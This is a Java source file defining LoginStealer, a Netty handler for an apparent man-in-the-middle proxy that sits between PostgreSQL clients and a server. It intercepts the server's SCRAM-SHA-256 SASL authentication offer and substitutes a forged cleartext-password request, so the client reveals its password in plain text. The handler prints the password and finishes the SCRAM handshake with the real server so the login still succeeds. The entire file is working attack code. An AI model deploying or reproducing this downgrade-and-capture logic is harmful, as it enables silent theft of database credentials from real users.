package dev.bandarlog.test.netty.proxy.postgres.lean;

import static dev.bandarlog.test.netty.proxy.postgres.lean.MessageFactory.buildAuthenticationResponse;
import static dev.bandarlog.test.netty.proxy.postgres.lean.MessageFactory.buildSASLInitialResponse;
import static dev.bandarlog.test.netty.proxy.postgres.lean.MessageFactory.buildSASLResponse;

import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor;
import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor.Listener;
import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor.Sender;
import com.bolyartech.scram_sasl.client.ScramSha256SaslClientProcessor;

import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.AuthenticationResponse;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.AuthenticationResponse.AuthenticationResponseType;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.Password;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;

/**
 * This class here implements the MITM logic:
 * <ul>
 * <li>Forwards the stolen credentials to the server</li>
 * </ul>
 */
public class LoginStealer extends ChannelDuplexHandler {

	private static final ChannelFutureListener FIRE = ChannelFutureListener.FIRE_EXCEPTION_ON_FAILURE;
	
	private static final ByteBuf CLEARTEXT = Unpooled.wrappedBuffer(new byte[] { 'R', 0, 0, 0, 8, 0, 0, 0, 3 });
	
	private ScramSaslClientProcessor saslProcessor;
	
	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
		
		if (msg instanceof Password) {
			final Password password = (Password) msg;
			final String pass = password.getPassword();
			
			System.out.println("/!\\ Got password: " + pass);
			
			saslProcessor.start("", pass);
			
			return;
		} else {
			System.out.println("Reading: " + msg);
		}
		
		super.channelRead(ctx, msg);
	}
	
	@Override
	public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {
		
		if (msg instanceof AuthenticationResponse) {
			final AuthenticationResponse response = (AuthenticationResponse) msg;
			
			System.out.println("Authentication response: " + response.getAuthenticationResponseType());
			
			// hijack the response to force cleartext
			
			if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL) {
				// shit.
				response.release();
				
				// send a cleartext instead
				super.write(ctx, CLEARTEXT.retain(), promise);
				
				Listener listener = new Listener() {
					
					@Override
					public void onSuccess() {
						System.out.println("/!\\ SASL Success !");
					}
					
					@Override
					public void onFailure() {
						System.out.println("/!\\ SASL Failure !");
						// TODO: send error message
					}
				};
				Sender sender = new Sender() {
					
					private boolean firstResponse = true;
					
					@Override
					public void sendMessage(String msg) {
						try {
							System.out.println("Sending message: " + msg);

							final PostgresMessages message;
							if (firstResponse) {
								message = buildSASLInitialResponse(ctx.alloc(), "SCRAM-SHA-256", msg);
								firstResponse = false;
							} else {
								message = buildSASLResponse(ctx.alloc(), msg);
							}
							
							System.out.println("PROXY >>> SERVER: " + message);
							ctx.fireChannelRead(message.retain());
							
						} catch (Exception e) {
							System.out.println("Caught exception: " + e);
							e.printStackTrace();
						}
					}
				};
				saslProcessor = new ScramSha256SaslClientProcessor(listener, sender);
				return;
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL_CONTINUE ||
					response.getAuthenticationResponseType() == AuthenticationResponseType.SASL_FINAL) {
				// good, continue
				final String message = response.getPayload();
				response.release();

				System.out.println("Received challenge: " + message);
				
				// forward to the next step
				saslProcessor.onMessage(message);
				
				promise.setSuccess();
				return;
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.CLEARTEXT) {
				// good
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.MD5) {
				// manageable
			}
		}
		
		System.out.println("SERVER >>> CLIENT: " + msg);
		super.write(ctx, msg, promise);
	}
}